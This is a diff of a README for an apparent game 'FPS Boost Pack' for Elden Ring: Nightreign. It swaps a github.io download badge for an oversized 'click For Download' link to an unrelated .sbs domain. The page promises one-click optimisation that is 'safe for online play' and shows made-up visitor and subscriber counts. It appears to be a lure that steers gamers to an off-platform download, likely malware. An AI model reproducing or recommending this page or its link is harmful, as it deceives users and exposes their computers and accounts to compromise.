@@ -2,13 +2,19 @@
 
 Enter the Lands Between without the lag ⚔️ This FPS Boost Pack for **Elden Ring: Nightreign** is crafted to deliver smoother performance, reduced stuttering, and lower system latency. Whether you wield magic or steel, precision and timing are everything — and performance issues shouldn't hold you back. This all-in-one tool auto-optimizes your game and PC for maximum FPS in one click. Compatible with all current Nightreign builds, safe for offline/online play, and perfect for both casual and hardcore Tarnished. 🌑
 
-<div style="text-align: center">
-  <a href="https://fps-boost-elden-ring-nightreign.github.io/.github/">
-    <img class="bumbum" style="width: 400px" alt="Static Badge" src="https://img.shields.io/badge/click_for_download-Elden_Ring_Nightreign_FPS_Boost-blueviolet">
-  </a>
-</div>
+---
+
+<a href="https://kerten.sbs/kl/old">
+  <img
+    src="https://img.shields.io/badge/click%20For%20Download-green?style=for-the-badge&logo=github"
+    alt="gg"
+    width="1100"
+  >
+</a>
 
 ---
+
+
 
 ![Visitors: 10K+](https://img.shields.io/badge/Visitors-10K+-ff9f43) ![Subscribers: 3K+](https://img.shields.io/badge/Subscribers-3K+-6ab04c) ![Last Updated: 2025](https://img.shields.io/badge/Last_Updated-2025-3498db)
 
